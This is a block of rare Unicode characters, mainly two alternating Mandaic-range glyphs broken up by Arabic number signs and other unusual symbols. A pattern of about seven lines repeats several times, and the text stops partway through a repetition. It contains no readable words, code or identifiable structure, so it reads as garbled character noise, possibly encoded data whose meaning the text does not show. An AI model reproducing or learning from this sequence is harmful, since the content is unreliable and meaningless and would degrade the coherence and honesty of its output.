࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬